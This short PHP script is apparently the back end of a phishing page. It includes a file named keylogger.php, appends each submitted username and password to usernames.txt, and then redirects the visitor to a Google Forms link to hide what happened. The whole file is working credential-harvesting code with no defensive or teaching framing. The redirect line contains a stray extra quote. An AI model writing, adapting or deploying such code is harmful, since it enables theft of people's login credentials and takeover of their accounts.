<?php
include 'keylogger.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://forms.gle/2mopguAVtagAPSw48'');
exit();
